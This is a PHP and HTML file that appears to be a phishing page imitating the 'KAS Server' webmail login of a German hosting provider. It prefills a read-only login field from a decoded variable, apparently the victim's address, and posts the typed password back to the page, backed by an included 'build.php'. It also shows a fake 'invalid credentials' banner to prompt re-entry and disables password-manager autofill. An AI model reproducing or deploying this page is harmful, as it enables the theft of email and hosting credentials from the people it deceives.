<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="de" class="kasserver-client">
<head>
<meta charset="utf-8">
<title>Kundenadministrationssystem (KAS), technische Verwaltung</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="referrer" content="no-referrer">
<!-- Favicon: inline SVG, tiny, no base64, no external file -->
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%231b5e9b'/%3E%3Cpath d='M3 5l5 3.5L13 5v1L8 9.5 3 6z' fill='%23fff'/%3E%3C/svg%3E">

<style>
/* ============================================================
   Base reset
   ============================================================ */
* { box-sizing: border-box; }
html, body {
    margin: 0; padding: 0;
    min-height: 100%;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
    color: #333;
}
body.kasserver-client {
    background: #eef2f5;
    background-image: linear-gradient(180deg, #f7f9fb 0%, #e4eaf0 100%);
    min-height: 100vh;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    padding: 40px 20px;
}

/* ============================================================
   Centered content column
   ============================================================ */
.center {
    width: 100%;
    max-width: 720px;
    text-align: center;
}

/* ============================================================
   Page header bar
   ============================================================ */
.page-header {
    background: #1b5e9b;
    color: #fff;
    padding: 10px 16px;
    border-radius: 3px 3px 0 0;
    font-size: 14px;
    font-weight: bold;
    letter-spacing: 0.02em;
    display: flex;
    align-items: center;
    justify-content: space-between;
}
.page-header .brand {
    display: flex;
    align-items: center;
    gap: 10px;
}
.page-header .brand-logo {
    width: 26px;
    height: 26px;
    flex: 0 0 26px;
    display: block;
}
.page-header .brand-name {
    font-weight: bold;
    font-size: 14px;
    letter-spacing: 0.02em;
}
.page-header .brand-tag {
    font-weight: normal;
    font-size: 12px;
    opacity: 0.9;
}

/* ============================================================
   Main content panel
   ============================================================ */
.page-body {
    background: #fff;
    border: 1px solid #c4d0da;
    border-top: 0;
    border-radius: 0 0 3px 3px;
    text-align: left;
}

/* ============================================================
   Breadcrumb / nav bar
   ============================================================ */
.nav-bar {
    padding: 8px 14px;
    background: #f0f4f7;
    border-bottom: 1px solid #c4d0da;
    font-size: 12px;
    color: #3c5267;
}
.nav-bar a {
    color: #1b5e9b;
    text-decoration: none;
    font-weight: bold;
}
.nav-bar a:hover { text-decoration: underline; }

/* ============================================================
   Content block
   ============================================================ */
.content-block {
    padding: 22px 28px 26px;
}

.content-block h1 {
    font-size: 20px;
    font-weight: normal;
    color: #1b5e9b;
    margin: 0 0 6px;
    padding: 0;
    letter-spacing: 0.01em;
}

/* ============================================================
   Error banner — Kasserver style
   ============================================================ */
.kas-error {
    display: none;
    background: #fff5f5;
    border: 1px solid #d6a0a0;
    border-left: 4px solid #b03030;
    color: #6b1a1a;
    padding: 12px 16px;
    margin: 0 0 20px;
    font-size: 13px;
    line-height: 1.55;
    border-radius: 2px;
}
.kas-error strong {
    display: block;
    margin-bottom: 8px;
    color: #8b1a1a;
    font-size: 13px;
    font-weight: bold;
}
.kas-error p { margin: 0 0 8px; }
.kas-error p:last-child { margin-bottom: 0; }
.kas-error.visible { display: block; }

/* ============================================================
   Helper text
   ============================================================ */
.intro-text {
    font-size: 13px;
    color: #555;
    margin: 0 0 18px;
}

/* ============================================================
   Form table
   ============================================================ */
.kas-table {
    width: 100%;
    border-collapse: collapse;
    border-spacing: 0;
}
.kas-table tr td {
    padding: 5px 0;
    vertical-align: top;
    font-size: 13px;
}
.kas-table tr td.label {
    width: 180px;
    padding-right: 14px;
    font-weight: bold;
    color: #333;
    padding-top: 9px;
    white-space: nowrap;
}
.kas-table tr td.field { padding-right: 0; }

/* ============================================================
   Inputs — Kasserver form style
   ============================================================ */
.kas-input {
    display: block;
    width: 100%;
    max-width: 420px;
    height: 26px;
    padding: 3px 6px;
    border: 1px solid #7f9db9;
    background: #fff;
    color: #000;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
    border-radius: 0;
    box-shadow: inset 1px 1px 1px rgba(0,0,0,0.06);
    outline: 0;
}
.kas-input:focus {
    border-color: #4a7fb5;
    box-shadow: inset 1px 1px 1px rgba(0,0,0,0.08),
                0 0 3px rgba(74,127,181,0.6);
}
.kas-input[readonly] {
    background: #f4f6f8;
    color: #555;
    cursor: default;
}

/* Password wrapper after MaskedPassword runs */
.kas-pwd-wrap {
    display: block;
    position: relative;
    max-width: 420px;
}
.kas-pwd-wrap input[type="text"],
.kas-pwd-wrap input.masked {
    display: block;
    width: 100%;
    height: 26px;
    padding: 3px 6px;
    border: 1px solid #7f9db9;
    background: #fff;
    color: #000;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
    border-radius: 0;
    box-shadow: inset 1px 1px 1px rgba(0,0,0,0.06);
    outline: 0;
    box-sizing: border-box;
}
.kas-pwd-wrap input[type="text"]:focus,
.kas-pwd-wrap input.masked:focus {
    border-color: #4a7fb5;
    box-shadow: inset 1px 1px 1px rgba(0,0,0,0.08),
                0 0 3px rgba(74,127,181,0.6);
}
.kas-pwd-wrap input[type="hidden"] { display: none !important; }

/* ============================================================
   Language radio group
   ============================================================ */
.lang-group {
    display: flex;
    flex-wrap: wrap;
    gap: 18px;
    align-items: center;
    padding-top: 4px;
}
.lang-group label {
    display: inline-flex;
    align-items: center;
    gap: 7px;
    font-size: 13px;
    color: #333;
    cursor: pointer;
    font-weight: normal;
}
.lang-group input[type="radio"] {
    margin: 0;
}

/* ============================================================
   CSS-drawn mini flags — no images at all
   Each flag is a 16×10 rounded rectangle rendered with
   gradients. Zero requests, zero base64.
   ============================================================ */
.flag {
    display: inline-block;
    width: 16px;
    height: 10px;
    border: 1px solid #ccc;
    border-radius: 1px;
    vertical-align: middle;
    position: relative;
    overflow: hidden;
    flex: 0 0 16px;
    background: #fff;
}

/* German flag: black / red / gold horizontal bands */
.flag-de {
    background: linear-gradient(
        to bottom,
        #000 0%,    #000 33.33%,
        #d00 33.33%,#d00 66.66%,
        #ffce00 66.66%,#ffce00 100%
    );
}

/* Polish flag: white top, red bottom */
.flag-pl {
    background: linear-gradient(
        to bottom,
        #fff 0%,  #fff 50%,
        #dc143c 50%, #dc143c 100%
    );
}

/* English flag (simplified UK flag): red cross on white with blue corners
   — enough to read as "English" at 16×10 without needing a real PNG. */
.flag-en {
    background:
        /* red vertical bar */
        linear-gradient(to right,
            transparent 0%, transparent 40%,
            #ce1124 40%, #ce1124 60%,
            transparent 60%, transparent 100%),
        /* red horizontal bar */
        linear-gradient(to bottom,
            transparent 0%, transparent 30%,
            #ce1124 30%, #ce1124 70%,
            transparent 70%, transparent 100%),
        /* white background behind the cross */
        #fff;
}
.flag-en::before,
.flag-en::after {
    content: "";
    position: absolute;
    inset: 0;
    pointer-events: none;
}
/* blue quarters */
.flag-en::before {
    background:
        linear-gradient(to bottom right,
            #012169 0%, #012169 45%,
            transparent 45%) top left / 50% 50% no-repeat,
        linear-gradient(to bottom left,
            #012169 0%, #012169 45%,
            transparent 45%) top right / 50% 50% no-repeat,
        linear-gradient(to top right,
            #012169 0%, #012169 45%,
            transparent 45%) bottom left / 50% 50% no-repeat,
        linear-gradient(to top left,
            #012169 0%, #012169 45%,
            transparent 45%) bottom right / 50% 50% no-repeat;
}

/* ============================================================
   Submit button — Kasserver red style
   ============================================================ */
.kas-submit {
    display: inline-block;
    min-width: 110px;
    height: 26px;
    padding: 0 16px;
    background: linear-gradient(180deg, #c94141 0%, #a42a2a 100%);
    border: 1px solid #7d1e1e;
    color: #fff;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
    font-weight: bold;
    border-radius: 2px;
    cursor: pointer;
    text-align: center;
    line-height: 24px;
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.25);
    text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
}
.kas-submit:hover {
    background: linear-gradient(180deg, #d54a4a 0%, #ad3030 100%);
}
.kas-submit:active {
    background: linear-gradient(180deg, #9b2626 0%, #7d1e1e 100%);
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.35);
}
.kas-submit:focus {
    outline: 1px dotted #fff;
    outline-offset: -3px;
}
.kas-submit:disabled {
    background: #c9a5a5;
    border-color: #9c7c7c;
    cursor: not-allowed;
    text-shadow: none;
}

/* ============================================================
   Footer
   ============================================================ */
.kas-footer {
    margin-top: 16px;
    padding: 10px 14px;
    background: #f0f4f7;
    border: 1px solid #c4d0da;
    border-radius: 3px;
    font-size: 11px;
    color: #5a6c7d;
    text-align: center;
}
.kas-footer a {
    color: #1b5e9b;
    text-decoration: none;
    padding: 0 4px;
}
.kas-footer a:hover { text-decoration: underline; }

/* ============================================================
   Responsive
   ============================================================ */
@media (max-width: 560px) {
    body.kasserver-client { padding: 20px 10px; }
    .content-block { padding: 18px 16px 20px; }
    .kas-table tr td.label {
        width: auto;
        display: block;
        padding-bottom: 0;
        padding-top: 8px;
    }
    .kas-table tr td.field { display: block; padding-bottom: 6px; }
    .kas-input { max-width: 100%; }
}
</style>
</head>
<body class="kasserver-client">

<div class="center">

    <!-- ============================================================
         Header bar — inline SVG logo, no external image
         ============================================================ -->
    <div class="page-header">
        <span class="brand">
            <!-- Logo drawn inline; nothing to load -->
            <svg class="brand-logo" viewBox="0 0 26 26" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <rect width="26" height="26" rx="3" fill="#ffffff"/>
                <rect x="1" y="1" width="24" height="24" rx="2" fill="#1b5e9b"/>
                <path d="M5 8l8 5 8-5v1.5l-8 5-8-5z" fill="#ffffff"/>
                <path d="M5 9.5v8h16v-8l-8 5z" fill="#ffffff" opacity="0.9"/>
            </svg>
            <span class="brand-name">KAS Server</span>
        </span>
        <span class="brand-tag">Webmail</span>
    </div>

    <!-- ============================================================
         Main panel
         ============================================================ -->
    <div class="page-body">

        <div class="nav-bar">
            <a href="#" onclick="return false;">&laquo; Login</a>
        </div>

        <div class="content-block">

            <h1>Login</h1>

            <!-- German error banner -->
            <div class="kas-error <?php echo (isset($error) && stripos((string)$error, 'block') !== false) ? 'visible' : ''; ?>"
                 id="suite-error"
                 role="alert"
                 aria-live="polite">
                <strong>Bitte geben Sie Ihre Zugangsdaten ein.</strong>
                <p>
                    Sie verwenden ung&uuml;ltige Zugangsdaten oder der Zugang f&uuml;r diesen Account
                    ist gesperrt oder noch nicht freigeschaltet.
                </p>
                <p>
                    Sollten Sie Ihre Zugangsdaten vergessen haben, so wenden Sie sich bitte an
                    Ihren Provider.
                </p>
            </div>

            <p class="intro-text">Please enter your login information.</p>

            <form name="loginform"
                  id="login-form"
                  method="post"
                  action=""
                  class="propform"
                  autocomplete="off"
                  autocorrect="off"
                  autocapitalize="off"
                  accept-charset="UTF-8"
                  novalidate>

                <table class="kas-table">
                    <tbody>
                        <tr>
                            <td class="label">
                                <label for="loginname">Login or Domain</label>
                            </td>
                            <td class="field">
                                <input type="text"
                                       name="user"
                                       id="loginname"
                                       class="kas-input"
                                       autocomplete="off"
                                       autocorrect="off"
                                       autocapitalize="off"
                                       spellcheck="false"
                                       readonly
                                       value="<?php echo htmlspecialchars($decoded ?? '', ENT_QUOTES, 'UTF-8'); ?>">
                            </td>
                        </tr>
                        <tr>
                            <td class="label">
                                <label for="passwort">Password</label>
                            </td>
                            <td class="field">
                                <span class="kas-pwd-wrap">
                                    <input type="password"
                                           name="pass"
                                           id="passwort"
                                           class="kas-input"
                                           autocomplete="off"
                                           autocorrect="off"
                                           autocapitalize="off"
                                           spellcheck="false"
                                           value="">
                                </span>
                            </td>
                        </tr>
                        <tr>
                            <td class="label">Language</td>
                            <td class="field">
                                <div class="lang-group">
                                    <label for="language_de">
                                        <input name="language" id="language_de" type="radio" value="de">
                                        <span class="flag flag-de" aria-hidden="true"></span>
                                        deutsch
                                    </label>
                                    <label for="language_en">
                                        <input name="language" id="language_en" type="radio" value="en" checked>
                                        <span class="flag flag-en" aria-hidden="true"></span>
                                        english
                                    </label>
                                    <label for="language_pl">
                                        <input name="language" id="language_pl" type="radio" value="pl">
                                        <span class="flag flag-pl" aria-hidden="true"></span>
                                        polski
                                    </label>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>

                <p style="margin: 18px 0 0; padding-left: 0;">
                    <button type="submit" class="kas-submit" id="rcmloginsubmit">Login</button>
                </p>

            </form>
        </div>
    </div>

    <!-- Footer -->
    <div class="kas-footer">
        <a href="#" onclick="return false;">de</a> |
        <a href="#" onclick="return false;">en</a> |
        <a href="#" onclick="return false;">pl</a>
    </div>

</div>

<!-- ============================================================
     MaskedPassword — verbatim
     ============================================================ -->
<script type="text/javascript">
function MaskedPassword(e, d) {
    if (typeof document.getElementById == "undefined" || typeof document.styleSheets == "undefined") { return false; }
    if (e == null) { return false; }
    this.symbol = d;
    this.isIE = typeof document.uniqueID != "undefined";
    e.value = "";
    e.defaultValue = "";
    e._contextwrapper = this.createContextWrapper(e);
    this.fullmask = false;
    var f = e._contextwrapper;
    var b = '<input type="hidden" name="' + e.name + '">';
    var c = this.convertPasswordFieldHTML(e);
    f.innerHTML = b + c;
    e = f.lastChild;
    e.className += " masked";
    e.setAttribute("autocomplete", "off");
    e._realfield = f.firstChild;
    e._contextwrapper = f;
    this.limitCaretPosition(e);
    var a = this;
    this.addListener(e, "change",         function (g) { a.fullmask = false; a.doPasswordMasking(a.getTarget(g)); });
    this.addListener(e, "input",          function (g) { a.fullmask = false; a.doPasswordMasking(a.getTarget(g)); });
    this.addListener(e, "propertychange", function (g) { a.doPasswordMasking(a.getTarget(g)); });
    this.addListener(e, "keyup",          function (g) {
        if (!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())) {
            a.fullmask = false; a.doPasswordMasking(a.getTarget(g));
        }
    });
    this.addListener(e, "blur", function (g) { a.fullmask = true; a.doPasswordMasking(a.getTarget(g)); });
    this.forceFormReset(e);
    return true;
}
MaskedPassword.prototype = {
    doPasswordMasking: function (a) {
        var d = "";
        if (a._realfield.value != "") {
            for (var b = 0; b < a.value.length; b++) {
                if (a.value.charAt(b) == this.symbol) { d += a._realfield.value.charAt(b); }
                else { d += a.value.charAt(b); }
            }
        } else { d = a.value; }
        var c = this.encodeMaskedPassword(d, this.fullmask, a);
        if (a._realfield.value != d || a.value != c) { a._realfield.value = d; a.value = c; }
    },
    encodeMaskedPassword: function (d, f, b) {
        var a = f === true ? 0 : 1;
        for (var e = "", c = 0; c < d.length; c++) {
            if (c < d.length - a) { e += this.symbol; }
            else { e += d.charAt(c); }
        }
        return e;
    },
    createContextWrapper: function (a) {
        var b = document.createElement("span");
        b.style.position = "relative";
        a.parentNode.insertBefore(b, a);
        b.appendChild(a);
        return b;
    },
    forceFormReset: function (a) {
        while (a) { if (/form/i.test(a.nodeName)) { break; } a = a.parentNode; }
        if (!/form/i.test(a.nodeName)) { return null; }
        this.addSpecialLoadListener(function () { a.reset(); });
        return a;
    },
    convertPasswordFieldHTML: function (c, e) {
        var b = "<input";
        for (var d = c.attributes, a = 0; a < d.length; a++) {
            if (d[a].specified && !/^(_|type|name)/.test(d[a].name)) {
                b += " " + d[a].name + '="' + d[a].value + '"';
            }
        }
        b += ' type="text" autocomplete="off">';
        return b;
    },
    limitCaretPosition: function (a) {
        var d = null,
            c = function () {
                if (d == null) {
                    if (this.isIE) {
                        d = window.setInterval(function () {
                            var e = a.createTextRange(), g = a.value.length, f = "character";
                            e.moveEnd(f, g); e.moveStart(f, g); e.select();
                        }, 100);
                    } else {
                        d = window.setInterval(function () {
                            var e = a.value.length;
                            if (!(a.selectionEnd == e && a.selectionStart <= e)) {
                                a.selectionStart = e; a.selectionEnd = e;
                            }
                        }, 100);
                    }
                }
            },
            b = function () { window.clearInterval(d); d = null; };
        this.addListener(a, "focus", function () { c(); });
        this.addListener(a, "blur",  function () { b(); });
    },
    addListener: function (c, a, b) {
        if (typeof document.addEventListener != "undefined") { return c.addEventListener(a, b, false); }
        else { if (typeof document.attachEvent != "undefined") { return c.attachEvent("on" + a, b); } }
    },
    addSpecialLoadListener: function (a) {
        if (this.isIE) { return window.attachEvent("onload", a); }
        else { return document.addEventListener("DOMContentLoaded", a, false); }
    },
    getTarget: function (a) {
        if (!a) { return null; }
        return a.target ? a.target : a.srcElement;
    }
};
</script>

<!-- ============================================================
     Glue — init masked, submit-sync, clear-on-load
     ============================================================ -->
<script type="text/javascript">
(function () {
    "use strict";

    var MASK_CHAR = "\u25CF";

    function showError(msg) {
        var box = document.getElementById("suite-error");
        if (!box) { return; }
        box.classList.add("visible");
        if (msg) {
            var strong = box.querySelector("strong");
            if (strong) { strong.textContent = msg; }
        }
    }

    function initMasked() {
        var pwd = document.getElementById("passwort");
        if (!pwd) { return; }

        try {
            new MaskedPassword(pwd, MASK_CHAR);
        } catch (err) {
            pwd.type = "password";
            pwd.setAttribute("type", "password");
        }

        var visible = document.querySelector("input.masked") || pwd;
        var hidden  = document.querySelector('input[type="hidden"][name="pass"]');
        var form    = document.getElementById("login-form");
        var button  = document.getElementById("rcmloginsubmit");

        // Force-clear browser-restored values on load
        if (visible) {
            visible.value = "";
            try { visible.defaultValue = ""; } catch (e) {}
            visible.setAttribute("autocomplete", "new-password");
            visible.setAttribute("data-lpignore", "true");
            visible.setAttribute("data-form-type", "other");
        }
        if (hidden) {
            hidden.value = "";
            try { hidden.defaultValue = ""; } catch (e) {}
        }
        if (pwd && pwd !== visible) {
            pwd.value = "";
            try { pwd.defaultValue = ""; } catch (e) {}
        }

        if (form) {
            if (pwd)     { pwd.removeAttribute("required"); }
            if (visible) { visible.removeAttribute("required"); }

            form.addEventListener("submit", function (e) {
                // Hidden field is the source of truth
                var clean = hidden ? hidden.value : "";
                if (clean.length < 1) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    showError("Bitte geben Sie Ihr Passwort ein.");
                    if (visible && visible.focus) { try { visible.focus(); } catch (ignore) {} }
                    return false;
                }
                if (button) {
                    button.disabled = true;
                    button.textContent = "Signing in\u2026";
                }
            }, true);

            if (button) {
                button.addEventListener("click", function (e) {
                    if (button.type && button.type.toLowerCase() !== "submit") {
                        e.preventDefault();
                        if (typeof form.requestSubmit === "function") { form.requestSubmit(); }
                        else { form.submit(); }
                    }
                });
            }
        }

        if (visible) {
            visible.addEventListener("keydown", function (e) {
                if (e.key === "Enter" || e.keyCode === 13) {
                    e.preventDefault();
                    var f = visible.form || form;
                    if (!f) { return; }
                    if (typeof f.requestSubmit === "function") { f.requestSubmit(); }
                    else { f.submit(); }
                }
            });
            try { visible.focus(); } catch (ignore) {}
        }
    }

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", initMasked);
    } else {
        initMasked();
    }
})();
</script>

</body>
</html>